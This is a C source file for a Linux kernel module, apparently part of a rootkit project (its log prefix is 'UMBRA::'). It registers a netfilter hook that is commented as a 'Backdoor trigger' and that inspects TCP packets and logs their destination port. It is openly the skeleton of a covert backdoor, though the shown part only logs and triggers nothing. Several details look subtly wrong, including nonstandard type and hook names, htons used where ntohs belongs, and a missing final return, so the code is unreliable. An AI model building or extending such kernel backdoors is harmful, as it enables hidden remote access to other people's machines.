#include "../include/netfilter_manager.h"

struct def_nf_hook_ops nf_hook_ops = {
    .hook	  = net_hook,
    .owner	  = THIS_MODULE,
    .pf		  = NFPROTO_IPV4,
    .hooknum  = NET_INET_FORWARD,
    .priority = NF_IP4_PRI_FIRST
};

unsigned int net_hook (unsigned int hook_num, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
    //Network headers
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;    
    struct sk_buff *sock_buff = skb;

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }

    ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        dport = htons((unsigned short int) tcp_header->dest);
        printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
    }

}